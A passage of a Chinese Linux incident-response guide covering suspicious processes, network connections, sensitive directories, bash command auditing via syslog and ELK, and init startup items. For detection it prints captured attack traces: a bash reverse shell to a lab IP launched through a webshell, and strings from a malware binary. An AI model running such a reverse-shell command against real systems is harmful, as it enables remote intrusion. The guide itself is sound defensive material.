<p style="text-align: left;">检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程也会隐藏。<br style="outline: none;"/>1）资源占用<br style="outline: none;"/>Top然后找到CPU和MEM排序<br style="outline: none;"/>2）启动时间<br style="outline: none;"/>可疑与前面找到的Webshell时间点比对。<br style="outline: none;"/>3）启动权限<br style="outline: none;"/>这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：</p>
<pre class="brush:html;toolbar:false;">mysql&nbsp;63763&nbsp;45.3&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;R&nbsp;01:18&nbsp;470:54&nbsp;./db_temp/dazui.4
mysql&nbsp;63765&nbsp;0.0&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;S&nbsp;01:18&nbsp;0:01&nbsp;./db_temp/dazui.4
mysql&nbsp;63766&nbsp;0.0&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;S&nbsp;01:18&nbsp;0:37&nbsp;./db_temp/dazui.4
mysql&nbsp;64100&nbsp;45.2&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;R&nbsp;01:20&nbsp;469:07&nbsp;./db_temp/dazui.4
mysql&nbsp;64101&nbsp;0.0&nbsp;0.0&nbsp;12284&nbsp;9616&nbsp;?&nbsp;S&nbsp;01:20&nbsp;0:01&nbsp;./db_temp/dazui.4</pre>
<p style="text-align: left;">那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。<br style="outline: none;"/>4）父进程<br style="outline: none;"/>例如我在菜刀中反弹Bash</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;html]#&nbsp;ps&nbsp;-ef&nbsp;|&nbsp;grep&nbsp;&#39;/dev/tcp&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;grep
apache&nbsp;26641&nbsp;1014&nbsp;0&nbsp;14:59&nbsp;?&nbsp;00:00:00&nbsp;sh&nbsp;-c&nbsp;/bin/sh&nbsp;-c&nbsp;&quot;cd&nbsp;/root/apache-tomcat-6.0.32/webapps/ROOT/;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/192.168.192.144/2345&nbsp;0&gt;&amp;1;echo&nbsp;[S];pwd;echo&nbsp;[E]&quot;&nbsp;2&gt;&amp;1</pre>
<p style="text-align: left;">父进程进程号1014</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;html]#&nbsp;ps&nbsp;-ef&nbsp;|&nbsp;grep&nbsp;1014
apache&nbsp;1014&nbsp;1011&nbsp;0&nbsp;Sep19&nbsp;?&nbsp;00:00:00&nbsp;/usr/sbin/httpd</pre>
<p style="text-align: left;">可以看到父进程为apache，就可以判断攻击者通过Web入侵。</p>
<p style="text-align: left;">获取到可疑进程号之后，可疑使用lsof -p pid查看相关文件和路径。</p>
<p style="text-align: left;">例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称</p>
<pre class="brush:html;toolbar:false;">udp&nbsp;0&nbsp;0&nbsp;0.0.0.0:49937&nbsp;0.0.0.0:*&nbsp;131683/ls&nbsp;-la&nbsp;
udp&nbsp;0&nbsp;0&nbsp;0.0.0.0:47584&nbsp;0.0.0.0:*&nbsp;116515/ifconfig</pre>
<p style="text-align: left;">使用lsof -p pid可以看到可执行文件</p>
<pre class="brush:html;toolbar:false;">[root@DataNode105&nbsp;admin]#&nbsp;lsof&nbsp;-p&nbsp;131683
COMMAND&nbsp;PID&nbsp;USER&nbsp;FD&nbsp;TYPE&nbsp;DEVICE&nbsp;SIZE/OFF&nbsp;NODE&nbsp;NAME
hahidjqzx&nbsp;131683&nbsp;root&nbsp;cwd&nbsp;DIR&nbsp;8,98&nbsp;4096&nbsp;18087937&nbsp;/root
hahidjqzx&nbsp;131683&nbsp;root&nbsp;rtd&nbsp;DIR&nbsp;8,98&nbsp;4096&nbsp;2&nbsp;/
hahidjqzx&nbsp;131683&nbsp;root&nbsp;txt&nbsp;REG&nbsp;8,98&nbsp;625622&nbsp;24123895&nbsp;/usr/bin/hahidjqzxs</pre>
<p style="text-align: left;">可以文件类型可以使用file获取；</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;tmp]#&nbsp;file&nbsp;.zl
zl:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;statically&nbsp;linked,&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.9,&nbsp;not&nbsp;stripped</pre>
<p style="text-align: left;">对于二进制的文件可以使用strings读取可读字符</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;tmp]#&nbsp;strings&nbsp;.zl
rm&nbsp;-f&nbsp;/boot/IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/boot/.IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/boot/IptabLex&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/boot/.IptabLex&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr
/IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr/.IptabLes&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr/IptabLex&nbsp;;&nbsp;rm&nbsp;-f&nbsp;/usr/.IptabLex
netstat&nbsp;-anp&nbsp;|&nbsp;grep&nbsp;&quot;IptabLes&quot;&nbsp;|awk&nbsp;&#39;{print&nbsp;$NF}&#39;&nbsp;|cut&nbsp;-d&nbsp;&quot;/&quot;&nbsp;-f&nbsp;1&nbsp;|&nbsp;xargs&nbsp;kill&nbsp;-9&nbsp;&gt;&nbsp;/dev/null&nbsp;;free&nbsp;-m&nbsp;
&gt;&nbsp;/dev/null
netstat&nbsp;-anp&nbsp;|&nbsp;grep&nbsp;&quot;IptabLex&quot;&nbsp;|awk&nbsp;&#39;{print&nbsp;$NF}&#39;&nbsp;|cut&nbsp;-d&nbsp;&quot;/&quot;&nbsp;-f&nbsp;1&nbsp;|&nbsp;xargs&nbsp;kill&nbsp;-9&nbsp;&gt;&nbsp;/dev/null&nbsp;;free&nbsp;-m&nbsp;
&gt;&nbsp;/dev/null</pre>
<p style="text-align: left;">例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址。</p>
<pre class="brush:html;toolbar:false;">[root@i-9kp9tipm&nbsp;log]#&nbsp;strings&nbsp;/usr/bin/.sshd&nbsp;|&nbsp;egrep&nbsp;&#39;[1-9]{1,3}.[1-9]{1,3}.&#39;
8.8.8.8
8.8.4.4
8.8.8.8
61.132.163.68
202.102.192.68
202.102.213.68
58.242.2.2
202.38.64.1
211.91.88.129
211.138.180.2
218.104.78.2
202.102.199.68
202.175.3.3</pre>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x04 网络连接</strong></span></p>
<p style="text-align: left;">需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接是可以被隐藏的。</p>
<pre class="brush:html;toolbar:false;">netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;ESTABLISHED</pre>
<p style="text-align: left;">查看已经建立的网络连接，例如反弹bash</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;html]#&nbsp;netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;EST&nbsp;|&nbsp;grep&nbsp;bash
tcp&nbsp;0&nbsp;0&nbsp;192.168.192.120:41320&nbsp;192.168.192.144:2345&nbsp;ESTABLISHED&nbsp;26643/bash</pre>
<pre class="brush:html;toolbar:false;">netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;LISTEN</pre>
<p style="text-align: left;">检查可以监听端口，例如攻击者在本地开启sock5代理，然后使用SSH反弹sock5。</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;html]#&nbsp;netstat&nbsp;-antlp&nbsp;|&nbsp;grep&nbsp;LISTEN&nbsp;|&nbsp;grep&nbsp;1080
tcp&nbsp;0&nbsp;0&nbsp;0.0.0.0:1080&nbsp;0.0.0.0:*&nbsp;LISTEN&nbsp;26810/python
lsof&nbsp;-i:{port}</pre>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x05 敏感目录</strong></span></p>
<p style="text-align: left;">/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;~]#&nbsp;ls&nbsp;-ald&nbsp;/tmp/
drwxrwxrwt.&nbsp;10&nbsp;root&nbsp;root&nbsp;4096&nbsp;9月&nbsp;20&nbsp;09:41&nbsp;/tmp/
[root@server120&nbsp;~]#&nbsp;ls&nbsp;-ald&nbsp;/var/tmp/
drwxrwxrwt.&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;9月&nbsp;18&nbsp;16:57&nbsp;/var/tmp/
[root@server120&nbsp;~]#&nbsp;ls&nbsp;-ald&nbsp;/dev/shm
drwxrwxrwt.&nbsp;3&nbsp;root&nbsp;root&nbsp;60&nbsp;9月&nbsp;1&nbsp;10:23&nbsp;/dev/shm</pre>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x06 history</strong></span></p>
<p style="text-align: left;">默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。之前写的关于Bash审计方式也很推荐。从Bash4.1 版本开始，Bash开始支持Rsyslog，</p>
<p style="text-align: left;">下载bash-4.4，下载地址：&nbsp;<a href="https://ftp.gnu.org/gnu/bash/" target="_blank" textvalue="https://ftp.gnu.org/gnu/bash/">https://ftp.gnu.org/gnu/bash/</a></p>
<p style="text-align: left;">现在本机编译一份<br style="outline: none;"/>1）修改bashhist.c：<br style="outline: none;"/>修改771行</p>
<pre class="brush:html;toolbar:false;">syslog&nbsp;(SYSLOG_FACILITY|SYSLOG_LEVEL,&nbsp;&quot;PID=%d&nbsp;UID=%d&nbsp;User=%s&nbsp;Cmd=%s&quot;,&nbsp;getpid(),&nbsp;current_user.uid,&nbsp;current_user.user_name,&nbsp;line);</pre>
<p style="text-align: left;">修改776行</p>
<pre class="brush:html;toolbar:false;">syslog&nbsp;(SYSLOG_FACILITY|SYSLOG_LEVEL,&nbsp;&quot;PID=%d&nbsp;UID=%d&nbsp;User=%s&nbsp;Cmd=%s&quot;,&nbsp;getpid(),&nbsp;current_user.uid,&nbsp;current_user.user_name,&nbsp;trunc);</pre>
<p style="text-align: left;">2）再修改config-top.h<br style="outline: none;"/>去掉115行/**/<br style="outline: none;"/>syslog的FACILITY为 user，日志级别为info<br style="outline: none;"/>3）</p>
<pre class="brush:html;toolbar:false;">./configure&nbsp;--prefix=/usr/local/bash&nbsp;&amp;&amp;&nbsp;make&nbsp;&amp;&amp;&nbsp;make&nbsp;install</pre>
<p style="text-align: left;">将/usr/local/bash/bin/bash拷贝出来<br style="outline: none;"/>备份线上服务器原/bin/bash</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;~]#&nbsp;mv&nbsp;/bin/bash&nbsp;/bin/bashbak</pre>
<p style="text-align: left;">RZ放到线上服务器<br style="outline: none;"/>修改权限为755</p>
<p style="text-align: left;">4）修改rsyslog配置，这里我们先输出到本地测试一下</p>
<pre class="brush:html;toolbar:false;">[root@zaojiasys_31&nbsp;admin]#&nbsp;touch&nbsp;/var/log/bash.log
[root@zaojiasys_31&nbsp;admin]#&nbsp;vim&nbsp;/etc/rsyslog.conf</pre>
<p style="text-align: left;">添加user.info /var/log/bash.log</p>
<pre class="brush:html;toolbar:false;">[root@zaojiasys_31&nbsp;admin]#&nbsp;service&nbsp;rsyslog&nbsp;restart
[root@zaojiasys_31&nbsp;admin]#&nbsp;tail&nbsp;-f&nbsp;/var/log/bash.log&nbsp;
Jul&nbsp;25&nbsp;16:22:15&nbsp;localhost&nbsp;bash[18540]:&nbsp;PID=18540&nbsp;UID=0&nbsp;User=root&nbsp;Cmd=tail&nbsp;-f&nbsp;/var/log/bash.log&nbsp;
Jul&nbsp;25&nbsp;16:22:21&nbsp;localhost&nbsp;bash[19033]:&nbsp;PID=19033&nbsp;UID=0&nbsp;User=root&nbsp;Cmd=whoami</pre>
<p style="text-align: left;">5）<br style="outline: none;"/>[root@zaojiasys_31 admin]# vim /etc/rsyslog.conf<br style="outline: none;"/>修改*.info;mail.none;authpriv.none;cron.none;local6.none;user.none /var/log/messages 添加user.none<br style="outline: none;"/>添加user.info @10.110.1.33:3514</p>
<p style="text-align: left;">使用ELK，首先配置logstash</p>
<pre class="brush:html;toolbar:false;">input&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;syslog{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port&nbsp;=&gt;&nbsp;&quot;3514&quot;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type&nbsp;=&gt;&nbsp;&quot;bash&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
}
filter&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;grok{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;match&nbsp;=&gt;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;message&quot;&nbsp;=&gt;&nbsp;&quot;PID=%{NUMBER:processid}&nbsp;UID=%{NUMBER:uid}&nbsp;User=%{WORD:user}&nbsp;Cmd=%{GREEDYDATA:cmd}&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;date&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;match&nbsp;=&gt;&nbsp;[&quot;timestamp&quot;,&nbsp;&quot;MMM&nbsp;dd&nbsp;HH:mm:ss&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&gt;&nbsp;&quot;@timestamp&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;locale&quot;&nbsp;=&gt;&nbsp;&quot;en&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;timezone&nbsp;=&gt;&nbsp;&quot;UTC&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mutate&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;remove_field&nbsp;=&gt;&nbsp;[&nbsp;&quot;message&quot;&nbsp;]
&nbsp;&nbsp;&nbsp;&nbsp;}
}
output&nbsp;{
&nbsp;&nbsp;&nbsp;if&nbsp;&quot;_grokparsefailure&quot;&nbsp;not&nbsp;in&nbsp;[tags]&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elasticsearch&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts&nbsp;=&gt;&nbsp;&quot;10.110.1.33:9200&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&gt;&nbsp;&quot;bash_%{+YYYY.MM.dd}&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre>
<p style="text-align: left;">Elasticsearch 添加模板</p>
<pre class="brush:html;toolbar:false;">curl&nbsp;-XPUT&nbsp;10.59.0.248:9200/_template/template_bash&nbsp;-d&nbsp;&#39;
{
&nbsp;&nbsp;&nbsp;&quot;template&quot;:&nbsp;&quot;bash_*&quot;,&nbsp;
&nbsp;&nbsp;&nbsp;&quot;order&quot;&nbsp;:&nbsp;10,
&nbsp;&nbsp;&nbsp;&quot;settings&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;number_of_shards&quot;:&nbsp;5,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;number_of_replicas&quot;:&nbsp;0
&nbsp;&nbsp;&nbsp;},
&nbsp;&nbsp;&nbsp;&quot;mappings&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&quot;_default_&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;_all&quot;&nbsp;:&nbsp;{&quot;enabled&quot;&nbsp;:&nbsp;true,&nbsp;&quot;omit_norms&quot;&nbsp;:&nbsp;true},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;properties&quot;&nbsp;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;@timestamp&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;date&quot;&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;host&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;keyword&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;cmd&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;keyword&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;user&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;keyword&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;uid&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;integer&quot;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;processid&quot;:&nbsp;{&nbsp;&quot;type&quot;:&nbsp;&quot;integer&quot;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
}</pre>
<p style="text-align: left;">查看Kibana</p>
<p style="text-align:center"><img class="aligncenter size-full wp-image-7900" src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="http://img.4hou.com/wp-content/uploads/2017/10/98e5908d90345737b740.jpg" width="1098" height="373" alt=""/><noscript><img class="aligncenter size-full wp-image-7900" src="http://img.4hou.com/wp-content/uploads/2017/10/98e5908d90345737b740.jpg" width="1098" height="373" alt=""/></noscript></p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;~]#&nbsp;ll&nbsp;/bin/sh
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;4&nbsp;3月&nbsp;21&nbsp;2016&nbsp;/bin/sh&nbsp;-&gt;&nbsp;bash</pre>
<p style="text-align: left;">/bin/sh是软链到/bin/bash的，/bin/sh也可以审计到。<br style="outline: none;"/>另外禁用其他的shell：</p>
<pre class="brush:html;toolbar:false;">#&nbsp;chmod&nbsp;750&nbsp;/bin/csh
#&nbsp;chmod&nbsp;750&nbsp;/bin/tcsh
#&nbsp;chmod&nbsp;750&nbsp;/bin/dash</pre>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x07 开机启动</strong></span></p>
<p style="text-align: left;">在应急响应时，开机启动项是必查的项，下面梳理一下关于开机启动与服务相关需要排查的点。直接从init开始说。<br style="outline: none;"/>RHEL5、RHEL6、RHEL7的init系统分别为sysvinit、upstart、systemd。这里CentOS7暂且不表，因为生产环境绝大部分都是CentOS6，少量的CentOS5。</p>
<p style="text-align: left;">CentOS 5：<br style="outline: none;"/>init程序会读取init的配置文件/etc/inittab,并依据此文件来进行初始化工作。/etc/inittab文件主要作用是指定运行级别，执行系统初始化脚本（/etc/rc.d/rc.sysinit）,启动相应运行级别下的服务和启动终端。</p>
<pre class="brush:html;toolbar:false;">[root@jianshe_28&nbsp;admin]#&nbsp;cat&nbsp;/etc/inittab
#
#&nbsp;inittab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;file&nbsp;describes&nbsp;how&nbsp;the&nbsp;INIT&nbsp;process&nbsp;should&nbsp;set&nbsp;up
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;system&nbsp;in&nbsp;a&nbsp;certain&nbsp;run-level.
#
#&nbsp;Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Miquel&nbsp;van&nbsp;Smoorenburg,&nbsp;&lt;miq&#117;e&#108;s&#64;&#100;rink&#101;&#108;&#46;&#110;l&#46;m&#117;&#103;ne&#116;&#46;&#111;rg&gt;
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modified&nbsp;for&nbsp;RHS&nbsp;Linux&nbsp;by&nbsp;Marc&nbsp;Ewing&nbsp;and&nbsp;Donnie&nbsp;Barnes
#
#&nbsp;Default&nbsp;runlevel.&nbsp;The&nbsp;runlevels&nbsp;used&nbsp;by&nbsp;RHS&nbsp;are:
#&nbsp;&nbsp;&nbsp;0&nbsp;-&nbsp;halt&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;&nbsp;&nbsp;1&nbsp;-&nbsp;Single&nbsp;user&nbsp;mode
#&nbsp;&nbsp;&nbsp;2&nbsp;-&nbsp;Multiuser,&nbsp;without&nbsp;NFS&nbsp;(The&nbsp;same&nbsp;as&nbsp;3,&nbsp;if&nbsp;you&nbsp;do&nbsp;not&nbsp;have&nbsp;networking)
#&nbsp;&nbsp;&nbsp;3&nbsp;-&nbsp;Full&nbsp;multiuser&nbsp;mode
#&nbsp;&nbsp;&nbsp;4&nbsp;-&nbsp;unused
#&nbsp;&nbsp;&nbsp;5&nbsp;-&nbsp;X11
#&nbsp;&nbsp;&nbsp;6&nbsp;-&nbsp;reboot&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;
id:3:initdefault:
#&nbsp;System&nbsp;initialization.
si::sysinit:/etc/rc.d/rc.sysinit
l0:0:wait:/etc/rc.d/rc&nbsp;0
l1:1:wait:/etc/rc.d/rc&nbsp;1
l2:2:wait:/etc/rc.d/rc&nbsp;2
l3:3:wait:/etc/rc.d/rc&nbsp;3
l4:4:wait:/etc/rc.d/rc&nbsp;4
l5:5:wait:/etc/rc.d/rc&nbsp;5
l6:6:wait:/etc/rc.d/rc&nbsp;6
#&nbsp;Trap&nbsp;CTRL-ALT-DELETE
ca::ctrlaltdel:/sbin/shutdown&nbsp;-t3&nbsp;-r&nbsp;now
#&nbsp;When&nbsp;our&nbsp;UPS&nbsp;tells&nbsp;us&nbsp;power&nbsp;has&nbsp;failed,&nbsp;assume&nbsp;we&nbsp;have&nbsp;a&nbsp;few&nbsp;minutes
#&nbsp;of&nbsp;power&nbsp;left.&nbsp;&nbsp;Schedule&nbsp;a&nbsp;shutdown&nbsp;for&nbsp;2&nbsp;minutes&nbsp;from&nbsp;now.
#&nbsp;This&nbsp;does,&nbsp;of&nbsp;course,&nbsp;assume&nbsp;you&nbsp;have&nbsp;powerd&nbsp;installed&nbsp;and&nbsp;your
#&nbsp;UPS&nbsp;connected&nbsp;and&nbsp;working&nbsp;correctly.&nbsp;&nbsp;
pf::powerfail:/sbin/shutdown&nbsp;-f&nbsp;-h&nbsp;+2&nbsp;&quot;Power&nbsp;Failure;&nbsp;System&nbsp;Shutting&nbsp;Down&quot;
#&nbsp;If&nbsp;power&nbsp;was&nbsp;restored&nbsp;before&nbsp;the&nbsp;shutdown&nbsp;kicked&nbsp;in,&nbsp;cancel&nbsp;it.
pr:12345:powerokwait:/sbin/shutdown&nbsp;-c&nbsp;&quot;Power&nbsp;Restored;&nbsp;Shutdown&nbsp;Cancelled&quot;
#&nbsp;Run&nbsp;gettys&nbsp;in&nbsp;standard&nbsp;runlevels
1:2345:respawn:/sbin/mingetty&nbsp;tty1
2:2345:respawn:/sbin/mingetty&nbsp;tty2
3:2345:respawn:/sbin/mingetty&nbsp;tty3
4:2345:respawn:/sbin/mingetty&nbsp;tty4
5:2345:respawn:/sbin/mingetty&nbsp;tty5
6:2345:respawn:/sbin/mingetty&nbsp;tty6
#&nbsp;Run&nbsp;xdm&nbsp;in&nbsp;runlevel&nbsp;5
x:5:respawn:/etc/X11/prefdm&nbsp;-nodaemon</pre>
<p style="text-align: left;">inittab文件中的值都是如下格式：</p>
<p style="text-align: left;">&gt; id:runlevel:action:process</p>
<p style="text-align: left;">id：<br style="outline: none;"/>id是指入口标识符，他是个字符串，对于getty、mingetty等，需求id和tty的编号相同，否则getty将不能正常工作。</p>
<p style="text-align: left;">runlevel：<br style="outline: none;"/>指定runlevel的级别。能指定多个runlevel级别，也能不为runlevel字段指定特定的值。<br style="outline: none;"/>运行级别决定了系统启动的绝大部分行为和目的。这个级别从0到6，具有不同的功能。不同的运行级定义如下：</p>
<pre class="brush:html;toolbar:false;">#&nbsp;0&nbsp;-&nbsp;停机（千万别把initdefault设置为0，否则系统永远无法启动）
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;1&nbsp;-&nbsp;单用户模式
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;2&nbsp;-&nbsp;多用户，没有&nbsp;NFS
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;3&nbsp;-&nbsp;完全多用户模式(标准的运行级)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;4&nbsp;-&nbsp;系统保留的
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;5&nbsp;-&nbsp;X11&nbsp;（x&nbsp;window)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;6&nbsp;-&nbsp;重新启动</pre>
<p style="text-align: left;">action：<br style="outline: none;"/>定义了该进程应该运行在何种状态下，其中action常用的种类有：</p>
<pre class="brush:html;toolbar:false;">wait：切换至某级别运行一次process
&nbsp;&nbsp;&nbsp;&nbsp;respawn：此process终止的话，就重新启动之
&nbsp;&nbsp;&nbsp;&nbsp;initdefault：设置默认运行级别的，process省略
&nbsp;&nbsp;&nbsp;&nbsp;sysinit：设定系统初始化方式，此处一般指定为：/etc/rc.d/rc.sysinit</pre>
<p style="text-align: left;">process：<br style="outline: none;"/>包含init执行的进程</p>
<p style="text-align: left;">下面看一下具体的配置</p>
<p style="text-align: left;">&gt; id:3:initdefault:</p>
<p style="text-align: left;">设置runlevel</p>
<p style="text-align: left;">&gt; si::sysinit:/etc/rc.d/rc.sysinit</p>
<p style="text-align: left;">执行了/etc/rc.d/rc.sysinit，一个shell脚本，他主要是完成一些系统初始化的工作，例如激活交换分区，检查磁盘，加载硬件模块及其他一些需要优先执行任务。</p>
<pre class="brush:html;toolbar:false;">l0:0:wait:/etc/rc.d/rc&nbsp;0
l1:1:wait:/etc/rc.d/rc&nbsp;1
l2:2:wait:/etc/rc.d/rc&nbsp;2
l3:3:wait:/etc/rc.d/rc&nbsp;3
l4:4:wait:/etc/rc.d/rc&nbsp;4
l5:5:wait:/etc/rc.d/rc&nbsp;5
l6:6:wait:/etc/rc.d/rc&nbsp;6</pre>
<p style="text-align: left;">/etc/rc.d/rc是个shell脚本，接受runlevel参数，去执行该runlevel目录下的所有的rc启动脚本。以启动级别为3为例，/etc/rc.d/rc3.d/其实都是一些链接文件，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。而这些rc启动脚本有着类似的用法，他们一般能接受start、stop、restart、status等参数。</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;init.d]#&nbsp;ll&nbsp;/etc/rc.d/rc3.d/
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;13&nbsp;15:04&nbsp;K01smartd&nbsp;-&gt;&nbsp;../init.d/smartd
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;13&nbsp;15:05&nbsp;S11auditd&nbsp;-&gt;&nbsp;../init.d/auditd
.....</pre>
<p style="text-align: left;">凡是以Kxx开头的，都以stop为参数来调用；凡是以Sxx开头的，都以start为参数来调用。xx是数字、表示的是启动顺序，按xx从小到大来执行。<br style="outline: none;"/>我们来用chkconfig修改一下试试</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;rc3.d]#&nbsp;ll&nbsp;|&nbsp;grep&nbsp;audit
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;13&nbsp;15:05&nbsp;S11auditd&nbsp;-&gt;&nbsp;../init.d/auditd
[root@localhost&nbsp;rc3.d]#&nbsp;chkconfig&nbsp;auditd&nbsp;off&nbsp;--level&nbsp;3
[root@localhost&nbsp;rc3.d]#&nbsp;ll&nbsp;|&nbsp;grep&nbsp;audit
